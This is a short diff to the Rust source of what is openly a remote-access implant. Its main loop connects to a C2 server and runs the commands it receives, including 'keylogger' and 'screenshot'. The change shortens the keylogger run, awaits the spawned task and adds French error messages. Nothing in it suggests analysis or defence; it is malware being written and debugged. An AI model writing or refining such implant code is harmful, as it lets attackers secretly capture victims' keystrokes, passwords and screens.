@@ -11,9 +11,13 @@ async fn main() {
             for command in commands {
                 match command.as_str() {
                     "keylogger" => {
-                        tokio::spawn(async {
-                            input::start_keylogger(120).await;
+                        let handle = tokio::spawn(async {
+                            input::start_keylogger(10).await;
                         });
+
+                        if let Err(e) = handle.await {
+                            eprintln!("La tâche keylogger a échoué : {:?}", e);
+                        }
                     }
                     "screenshot" => {
                         let handle = tokio::spawn(async {
@@ -42,4 +46,5 @@ async fn main() {
         }
         Err(e) => eprintln!("Erreur avec la connexion au C2: {}", e),
     }
+    
 }
